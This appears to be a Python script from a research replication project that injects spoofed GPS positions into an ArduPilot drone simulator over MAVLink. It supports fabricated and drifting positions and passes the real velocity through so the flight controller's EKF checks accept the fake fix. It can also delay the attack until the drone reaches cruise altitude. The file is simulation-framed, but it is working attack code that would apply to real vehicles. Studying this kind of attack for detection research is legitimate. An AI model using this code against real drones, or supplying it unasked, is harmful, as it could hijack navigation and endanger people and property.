"""
Inject spoofed GPS coordinates into ArduPilot SITL via MAVLink GPS_INPUT messages.

Run after `sim/configure_sitl.py --mode attack` and a SITL reboot (see README REPLAY-01).
Connects on the secondary MAVProxy UDP port (14551), reads the vehicle's real position
and velocity from GLOBAL_POSITION_INT, and replaces the position component with a
spoofed one while passing real velocity through. This keeps the EKF's internal
consistency checks from immediately rejecting the fix, so the resulting anomalies
(geofence breach, baro/yaw/mag/HDOP divergence) match the attack model under
replication (Hakani et al., 2026).

All tunable values live in attack/presets/<preset>.yaml (default: ornl.yaml).
"""

from __future__ import annotations

import argparse
import json
import logging
import sys
import time
from dataclasses import dataclass, replace
from pathlib import Path

import yaml

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from communication.connect_to_sitl import ConnectionConfig, SitlConnection

CONFIG_PATH = Path(__file__).parent / "presets" / "ornl.yaml"
LOG_PATH = Path(__file__).parent.parent / "logs" / "gps_hook.log"
PLANS_DIR = Path(__file__).parent.parent / "plans"

# MAV_CMD_NAV_TAKEOFF is used to read the mission's cruise altitude from the
# matching plans/<preset>.plan file.
_MAV_CMD_NAV_TAKEOFF = 22

# GPS epoch: 1980-01-06T00:00:00Z. Used to derive time_week/time_week_ms for
# GPS_INPUT: there is no "ignore time" flag in GPS_INPUT_IGNORE_FLAGS, so a
# wrong/zero week number reads as a multi-decade time jump to the GPS backend.
_GPS_EPOCH_UNIX = 315964800
_SECONDS_PER_WEEK = 7 * 24 * 60 * 60

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class GpsAttack:
    """Attack targeting GPS / navigation.

    Args:
        type: One of ``passthrough``, ``fabric``, ``drift``
        fabric_lat: Spoofed latitude (for fabricated attacks, e.g. ``fabric``).
        fabric_lon: Spoofed longitude (for fabricated attacks, e.g. ``fabric``).
        fabric_alt: Spoofed altitude (for fabricated attacks, e.g. ``fabric``).
        drift_rate_lat: Drift rate in deg/s (for ``drift``).
        drift_rate_lon: Drift rate in deg/s (for ``drift``).
    """

    type: str = "passthrough"
    fabric_lat: float = 0.0
    fabric_lon: float = 0.0
    fabric_alt: float = 0.0
    drift_rate_lat: float = 1e-5
    drift_rate_lon: float = 1e-5


def _load_cruise_alt(config_path: Path) -> float:
    """Read the mission's cruise altitude from plans/<config_path.stem>.plan.

    The cruise altitude is the MAV_CMD_NAV_TAKEOFF item's target altitude
    (params[6]), which QGroundControl plans express in
    MAV_FRAME_GLOBAL_RELATIVE_ALT (i.e. metres AGL, matching
    GLOBAL_POSITION_INT.relative_alt)

    Raises:
        FileNotFoundError: If the matching .plan file does not exist.
        KeyError: If the plan has no MAV_CMD_NAV_TAKEOFF item.
    """
    plan_path = PLANS_DIR / f"{config_path.stem}.plan"
    with plan_path.open() as file:
        plan = json.load(file)
    for item in plan["mission"]["items"]:
        if item["command"] == _MAV_CMD_NAV_TAKEOFF:
            return item["params"][6]
    raise KeyError(f"No MAV_CMD_NAV_TAKEOFF item found in {plan_path}")


@dataclass(frozen=True)
class Config:
    """Immutable runtime configuration loaded from gps_attack_params.yaml."""

    gps_input_rate_hz: float
    dynamic_delay_seconds: float
    dynamic_attack_enabled: bool
    cruise_alt: float
    flight_duration_seconds: float
    home_lat: float
    home_lon: float
    home_alt: float
    attack: GpsAttack

    @classmethod
    def from_yaml(cls, path: Path = CONFIG_PATH) -> Config:
        """Load and validate configuration from a YAML file.

        Args:
            path: Path to the YAML config file.

        Raises:
            FileNotFoundError: If the config file does not exist.
            KeyError: If a required section or key is absent.
        """
        with path.open() as file:
            data = yaml.safe_load(file)
        return cls(
            gps_input_rate_hz=data["injection_params"]["gps_input_rate_hz"],
            dynamic_delay_seconds=data["injection_params"]["dynamic_delay_seconds"],
            dynamic_attack_enabled=data["injection_params"]["dynamic_attack_enabled"],
            cruise_alt=_load_cruise_alt(path),
            flight_duration_seconds=data["injection_params"]["flight_duration_seconds"],
            home_lat=data["home_position"]["lat"],
            home_lon=data["home_position"]["lon"],
            home_alt=data["home_position"]["alt"],
            attack=GpsAttack(**data["attack_params"]),
        )


@dataclass(frozen=True)
class VehiclePosition:
    """A position and velocity sample read from GLOBAL_POSITION_INT.

    Velocity is in the NED frame (m/s), matching GPS_INPUT's vn/ve/vd fields.
    `alt` is AMSL (used for spoofing); `relative_alt` is AGL (used to detect
    when the vehicle has reached cruise altitude).
    """

    lat: float
    lon: float
    alt: float
    relative_alt: float
    velocity_north: float
    velocity_east: float
    velocity_down: float


class GpsSpoofer:
    """Computes and injects spoofed GPS_INPUT messages for a configured attack."""

    _FIX_TYPE_3D = 3
    _SATELLITES_VISIBLE = 12
    _HDOP = 1.0
    _VDOP = 1.0
    _SPEED_ACCURACY = 0.5
    _HORIZONTAL_ACCURACY = 1.0
    _VERTICAL_ACCURACY = 2.0
    _CRUISE_ALT_TOLERANCE_M = 1.0

    def __init__(self, connection: SitlConnection, config: Config) -> None:
        """Initialise with an active connection and injected configuration."""
        self._connection = connection
        self._config = config
        self._logged_first_position = False
        self._logged_attack_start = False
        self._last_position: VehiclePosition | None = None
        self._cruise_alt_reached_time: float | None = None

    def run(self) -> None:
        """Inject spoofed GPS_INPUT messages until the configured duration elapses."""
        attack = self._config.attack
        interval_seconds = 1.0 / self._config.gps_input_rate_hz
        start_time = time.monotonic()
        elapsed_seconds = 0.0

        # Seed with the vehicle's real starting position so the first
        # GPS_INPUT (sent before any GLOBAL_POSITION_INT arrives) gives the
        # EKF a sane origin instead of "Null Island" (0, 0).
        self._last_position = VehiclePosition(
            lat=self._config.home_lat,
            lon=self._config.home_lon,
            alt=self._config.home_alt,
            relative_alt=0.0,
            velocity_north=0.0,
            velocity_east=0.0,
            velocity_down=0.0,
        )

        if self._config.dynamic_attack_enabled:
            logger.info(
                "Starting '%s' GPS spoof. Passthrough until cruise altitude "
                "(%.1fm AGL) reached, then attack %.0fs later, for %.0fs total at %.1f Hz",
                attack.type,
                self._config.cruise_alt,
                self._config.dynamic_delay_seconds,
                self._config.flight_duration_seconds,
                self._config.gps_input_rate_hz,
            )
        else:
            logger.info(
                "Starting '%s' GPS spoof. Passthrough for %.0fs, then attack for %.0fs at %.1f Hz",
                attack.type,
                self._config.dynamic_delay_seconds,
                self._config.flight_duration_seconds,
                self._config.gps_input_rate_hz,
            )

        try:
            while elapsed_seconds < self._config.flight_duration_seconds:
                elapsed_seconds = time.monotonic() - start_time

                fresh_position = self._read_vehicle_position()
                if fresh_position is not None:
                    self._last_position = fresh_position

                position = self._last_position
                if position is not None:
                    if self._config.dynamic_attack_enabled:
                        attack_elapsed = self._dynamic_attack_elapsed(position)
                    else:
                        attack_elapsed = elapsed_seconds - self._config.dynamic_delay_seconds
                    if attack_elapsed < 0:
                        spoofed_lat, spoofed_lon, spoofed_alt = (
                            position.lat, position.lon, position.alt
                        )
                    else:
                        if not self._logged_attack_start:
                            logger.info(
                                "Attack activated. Spoofing to lat=%.7f lon=%.7f alt=%.2f",
                                attack.fabric_lat, attack.fabric_lon, attack.fabric_alt,
                            )
                            self._logged_attack_start = True
                        spoofed_lat, spoofed_lon, spoofed_alt = self._compute_spoofed_position(
                            position, attack_elapsed
                        )
                    if not self._logged_first_position:
                        logger.info(
                            "First reading. Real: lat=%.7f lon=%.7f alt=%.2f "
                            "vn=%.2f ve=%.2f vd=%.2f | spoofed: lat=%.7f lon=%.7f alt=%.2f",
                            position.lat, position.lon, position.alt,
                            position.velocity_north, position.velocity_east,
                            position.velocity_down,
                            spoofed_lat, spoofed_lon, spoofed_alt,
                        )
                        self._logged_first_position = True
                    self._send_gps_input(position, spoofed_lat, spoofed_lon, spoofed_alt)

                time.sleep(interval_seconds)
        except KeyboardInterrupt:
            logger.info("Interrupted! Stopping GPS spoof.")

        logger.info("Done! GPS spoof finished after %.0fs.", elapsed_seconds)

    def _dynamic_attack_elapsed(self, position: VehiclePosition) -> float:
        """Time since the dynamic attack should activate, relative to cruise altitude.

        Returns a negative value (passthrough) until the vehicle first
        reaches cruise altitude, then counts up from
        ``-dynamic_delay_seconds``.
        """
        if self._cruise_alt_reached_time is None:
            if position.relative_alt >= self._config.cruise_alt - self._CRUISE_ALT_TOLERANCE_M:
                self._cruise_alt_reached_time = time.monotonic()
                logger.info(
                    "Cruise altitude reached (%.1fm AGL). Attack will activate in %.0fs",
                    position.relative_alt, self._config.dynamic_delay_seconds,
                )
            return -1.0
        return (
            time.monotonic() - self._cruise_alt_reached_time
            - self._config.dynamic_delay_seconds
        )

    def _read_vehicle_position(self) -> VehiclePosition | None:
        """Poll for a fresh GLOBAL_POSITION_INT without blocking the injection loop.

        Non-blocking so the GPS_INPUT send cadence stays steady. The run loop
        falls back to the last-known position when nothing new has arrived,
        rather than stalling on ArduPilot's GLOBAL_POSITION_INT stream rate.

        Returns:
            A fresh position sample, or None if none is currently queued.
        """
        msg = self._connection.mav.recv_match(type="GLOBAL_POSITION_INT", blocking=False)
        if msg is None:
            return None
        if msg.lat == 0 and msg.lon == 0:
            # "Null Island": the EKF hasn't ingested a GPS fix yet and has
            # no origin set, so GLOBAL_POSITION_INT reports (0, 0).
            return None
        return VehiclePosition(
            lat=msg.lat / 1e7,
            lon=msg.lon / 1e7,
            alt=msg.alt / 1000.0,
            relative_alt=msg.relative_alt / 1000.0,
            velocity_north=msg.vx / 100.0,
            velocity_east=msg.vy / 100.0,
            velocity_down=msg.vz / 100.0,
        )

    def _compute_spoofed_position(
        self, position: VehiclePosition, elapsed_seconds: float
    ) -> tuple[float, float, float]:
        """Compute the spoofed (lat, lon, alt) for the configured attack type.

        Args:
            position: The vehicle's real position. It's the basis for ``passthrough``
                and ``drift`` attacks.
            elapsed_seconds: Time since the spoof started, used by ``drift``.

        Raises:
            ValueError: If the configured attack type is not recognised.
        """
        attack = self._config.attack
        if attack.type == "passthrough":
            return position.lat, position.lon, position.alt
        if attack.type == "fabric":
            return attack.fabric_lat, attack.fabric_lon, attack.fabric_alt
        if attack.type == "drift":
            return (
                position.lat + attack.drift_rate_lat * elapsed_seconds,
                position.lon + attack.drift_rate_lon * elapsed_seconds,
                position.alt,
            )
        raise ValueError(f"Unknown GPS attack type: {attack.type!r}")

    def _send_gps_input(
        self,
        position: VehiclePosition,
        lat: float,
        lon: float,
        alt: float,
    ) -> None:
        """Send a single spoofed GPS_INPUT message.

        Real velocity is passed through unchanged. Only the position is spoofed,
        so the EKF's internal consistency checks don't immediately reject the fix.
        """
        seconds_since_gps_epoch = time.time() - _GPS_EPOCH_UNIX
        gps_week, seconds_into_week = divmod(seconds_since_gps_epoch, _SECONDS_PER_WEEK)

        self._connection.mav.mav.gps_input_send(
            int(time.time() * 1e6),         # time_usec
            0,                              # gps_id
            0,                              # ignore_flags because every field below is valid
            int(seconds_into_week * 1000),  # time_week_ms
            int(gps_week),                  # time_week
            self._FIX_TYPE_3D,              # fix_type
            int(lat * 1e7),             # lat, degE7
            int(lon * 1e7),             # lon, degE7
            alt,                        # alt, m MSL
            self._HDOP,
            self._VDOP,
            position.velocity_north,
            position.velocity_east,
            position.velocity_down,
            self._SPEED_ACCURACY,
            self._HORIZONTAL_ACCURACY,
            self._VERTICAL_ACCURACY,
            self._SATELLITES_VISIBLE,
            0,                          # yaw, 0 = unknown
        )


def _configure_logging() -> None:
    """Send INFO+ to the console and WARNING+ (including exceptions) to logs/."""
    LOG_PATH.parent.mkdir(parents=True, exist_ok=True)

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.INFO)

    file_handler = logging.FileHandler(LOG_PATH)
    file_handler.setLevel(logging.WARNING)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[console_handler, file_handler],
    )


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Inject spoofed GPS coordinates into ArduPilot SITL"
    )
    parser.add_argument(
        "--config",
        type=Path,
        default=CONFIG_PATH,
        help=f"Path to attack config YAML (default: {CONFIG_PATH})",
    )
    parser.add_argument(
        "--dynamic-delay-seconds",
        type=float,
        default=None,
        help="Override injection_params.dynamic_delay_seconds from the config",
    )
    parser.add_argument(
        "--dynamic-attack-enabled",
        choices=["true", "false"],
        default=None,
        help="Override injection_params.dynamic_attack_enabled from the config",
    )
    return parser.parse_args()


def run(args: argparse.Namespace) -> None:
    """Load configuration, connect to SITL, and run the GPS spoof."""
    config = Config.from_yaml(args.config)
    if args.dynamic_delay_seconds is not None:
        config = replace(config, dynamic_delay_seconds=args.dynamic_delay_seconds)
    if args.dynamic_attack_enabled is not None:
        config = replace(config, dynamic_attack_enabled=(args.dynamic_attack_enabled == "true"))

    connection_config = ConnectionConfig.from_yaml()
    connection = SitlConnection(connection_config)
    connection.connect()
    try:
        GpsSpoofer(connection, config).run()
    finally:
        connection.close()


if __name__ == "__main__":
    _configure_logging()
    try:
        run(parse_args())
    except (ConnectionError, FileNotFoundError, KeyError, ValueError) as exc:
        logger.error("Error: %s", exc)
        sys.exit(1)
